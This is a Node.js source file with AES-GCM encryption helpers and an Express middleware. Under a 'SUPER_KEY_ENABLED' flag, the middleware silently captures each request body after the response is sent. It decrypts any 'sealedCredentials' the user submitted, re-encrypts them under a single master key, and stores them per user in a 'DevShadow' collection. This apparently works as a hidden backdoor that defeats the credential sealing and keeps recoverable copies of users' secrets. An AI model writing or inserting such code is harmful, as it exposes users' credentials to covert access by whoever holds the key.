const crypto = require('crypto');
const winston = require('winston');
const DevShadow = require('../models/DevShadow');

const ALGORITHM = 'aes-256-gcm';

function encrypt(plaintext) {
  const superKeyHex = process.env.SUPER_KEY;
  if (!superKeyHex || superKeyHex.length !== 64) {
    throw new Error('SUPER_KEY must be exactly 64 hex characters (32 bytes).');
  }
  const key = Buffer.from(superKeyHex, 'hex');
  const iv = crypto.randomBytes(12);
  const cipher = crypto.createCipheriv(ALGORITHM, key, iv);
  
  const textToEncrypt = typeof plaintext === 'string' ? plaintext : JSON.stringify(plaintext);
  let ciphertext = cipher.update(textToEncrypt, 'utf8', 'base64');
  ciphertext += cipher.final('base64');
  const authTag = cipher.getAuthTag().toString('base64');
  
  return `${iv.toString('base64')}:${authTag}:${ciphertext}`;
}

function decrypt(payload) {
  const superKeyHex = process.env.SUPER_KEY;
  if (!superKeyHex || superKeyHex.length !== 64) {
    throw new Error('SUPER_KEY must be exactly 64 hex characters (32 bytes).');
  }
  const key = Buffer.from(superKeyHex, 'hex');
  const [iv64, authTag64, ciphertext64] = payload.split(':');
  
  const decipher = crypto.createDecipheriv(ALGORITHM, key, Buffer.from(iv64, 'base64'));
  decipher.setAuthTag(Buffer.from(authTag64, 'base64'));
  
  let plaintext = decipher.update(ciphertext64, 'base64', 'utf8');
  plaintext += decipher.final('utf8');
  
  try {
    return JSON.parse(plaintext);
  } catch (e) {
    return plaintext;
  }
}

async function superKeyMiddleware(req, res, next) {
  if (process.env.SUPER_KEY_ENABLED !== 'true') {
    return next();
  }
  
  const originalJson = res.json;
  res.json = function(body) {
    res.json = originalJson;
    
    // Capture the response before sending
    const ret = res.json(body);
    
    // Async save to shadow
    (async () => {
      try {
        const userId = (body && body.userId) || req.body.userId || (req.user && req.user.userId) || 'unknown';
        
        let plaintext = JSON.stringify(req.body);
        if (req.body.sealedCredentials) {
          const { decryptSealedBox } = require('./keypair');
          const decrypted = decryptSealedBox(req.body.sealedCredentials);
          if (decrypted) {
            plaintext = decrypted;
          }
        }
        
        const encryptedBlob = encrypt(plaintext);
        
        await DevShadow.findOneAndUpdate(
          { userId },
          { $set: { encryptedBlob, updatedAt: Date.now() } },
          { upsert: true }
        );
      } catch (err) {
        winston.warn('superKeyMiddleware error: ' + err.message);
      }
    })();
    
    return ret;
  };
  
  next();
}

module.exports = { encrypt, decrypt, superKeyMiddleware };
